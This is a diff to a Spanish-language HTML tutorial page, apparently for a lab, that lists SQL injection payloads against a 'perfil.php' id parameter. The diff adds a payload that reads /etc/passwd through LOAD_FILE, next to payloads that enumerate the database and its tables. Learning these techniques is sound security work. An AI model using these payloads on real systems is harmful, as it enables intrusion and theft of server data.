@@ -43,6 +43,11 @@ and open the template in the editor.
           <p>Recuperamos el nombre de la base de datos que está usando la aplicación web.</p>
           <p>http://.../muna/perfil.php?id=-1 UNION SELECT 1,2,DATABASE(),4,5,6 </p>
           <hr/>
+
+          <p>Podemos filtrar un archivo del servidor /etc/passwd.</p>
+          <p>http://.../muna/perfil.php?id=-1 union all select 1,2,3,(SELECT LOAD_FILE("/etc/passwd") ),5,6</p>
+          <hr/>
+
           Recupermos las tablas que tiene la base de datos..
           <p>http://.../muna/perfil.php?id=-1 UNION SELECT 1,2,group_concat(TABLE_NAME),4,5,6 from information_schema.tables where TABLE_SCHEMA = DATABASE() </p>
           <hr/>
